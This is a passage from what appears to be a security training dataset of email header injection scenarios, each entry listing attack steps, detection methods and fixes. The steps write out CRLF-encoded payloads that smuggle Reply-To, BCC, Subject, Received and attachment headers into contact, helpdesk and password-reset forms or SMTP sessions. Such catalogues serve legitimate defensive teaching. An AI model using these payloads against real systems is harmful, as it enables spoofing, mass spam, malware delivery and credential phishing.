Scenario Description: MIME type is injected to confuse email parsing, allowing malicious attachments to appear harmless.
Tools Used: MIME Email Editor, Hex Viewer, Mail Client
Attack Steps: Step 1: Create a MIME section like: Content-Type: text/plain%0AContent-Disposition: attachment; filename=invoice.pdf.exe. Step 2: Send using injection vector in web app or SMTP relay. Step 3: Observe file is displayed as PDF icon but actually is executable. Step 4: Test on different email clients. Step 5: Log results for awareness training.
Detection Method: Analyze MIME consistency
Solution: Disallow multiple content types via injection

Title: Exploiting Help Desk Ticketing Systems
Scenario Description: Attacker injects reply-to or X-Origin headers to manipulate helpdesk workflows or steal replies.
Tools Used: Helpdesk Portal, Email Analyzer, Burp Suite
Attack Steps: Step 1: Access a customer-facing support form. Step 2: In "Email" field, inject: attacker@example.com%0AReply-To: attacker2@example.com. Step 3: Submit and trigger a support ticket. Step 4: When support replies, the reply goes to attacker2. Step 5: Demonstrate leakage of internal replies or credentials.
Detection Method: Header analysis and mail log review
Solution: Reject non-customer Reply-To overrides

Title: Exploiting Contact Form for Email Spoofing
Scenario Description: Attacker uses a vulnerable contact form with unsanitized inputs to inject email headers and spoof sender identity.
Tools Used: Burp Suite, Custom Python Script, Mailhog
Attack Steps: Step 1: Locate a website with a contact form (e.g., Contact Us page). Step 2: Intercept the form submission using Burp Suite to see the POST request. Step 3: Modify the email field in the POST request to inject new headers, like: attacker@example.com%0A%0DCC: victim@example.com%0A%0DBCC: competitor@example.com. Step 4: Submit the modified request. Step 5: Observe email being sent to attacker and other recipients without detection.
Vulnerability: Unsanitized user input in email headers
Impact: Email sent to unintended recipients, impersonation
Detection Method: Monitor headers and multiple recipients in outgoing mail logs
Solution: Validate and sanitize input fields; disallow newlines in email fields
Tags: SMTP Injection, Header Injection, Contact Form Exploit

Title: Abuse of Forgot Password Function to Spam Victims
Scenario Description: An attacker injects SMTP headers in the email field of a password reset form to send spam or malware links.
Attack Steps: Step 1: Visit a website with a "Forgot Password" feature. Step 2: Intercept the request using ZAP Proxy or Burp Suite. Step 3: Replace the email field with: victim@example.com%0ABCC:all-users@example.org%0ASubject:Free%20Crypto. Step 4: Submit and trigger email flood or mass spam. Step 5: Capture the resulting emails using Mailtrap to confirm spam delivery.
Impact: Mass spam, malware link distribution, reputation damage
Detection Method: Unusual volume of "forgot password" email activity
Solution: Encode/validate input; strip control characters in headers

Title: Bypassing SPF/DKIM Checks Using Header Injection
Scenario Description: Attacker forges headers to bypass anti-spoofing checks (e.g., SPF, DKIM) using vulnerable SMTP relay with misconfigured parsing.
Attack Steps: Step 1: Connect to a vulnerable internal SMTP server via Telnet or Netcat. Step 2: Use crafted headers: MAIL FROM:<realbank@example.com>%0AReceived: from trusted.relay%0A Step 3: Add fake Received headers and override From: to appear legitimate. Step 4: Send email to internal users to phish credentials. Step 5: Monitor responses using a phishing panel or sinkhole.
